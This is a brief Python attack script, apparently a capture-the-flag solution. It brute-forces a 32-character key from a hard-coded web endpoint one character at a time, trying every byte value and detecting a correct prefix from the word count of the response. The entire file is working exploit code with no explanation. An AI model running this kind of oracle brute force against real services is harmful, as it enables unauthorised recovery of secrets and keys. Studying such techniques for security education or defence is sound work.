#http://140.122.185.173:8080/post_submit
import requests

attack_url = "http://140.122.185.173:8080/post_submit"

ans = ""
for k in range(32):
    for i in range(256):
        ch =  ans + chr(i)
        data = {'guess': ch}
        x = requests.post(attack_url, data = data)
        txet = x.text
        arr = txet.split(" ")
        print(ch, len(arr))
        if(len(arr) == 44):
            ans += ch[-1]
            break


print("key is ", ans)
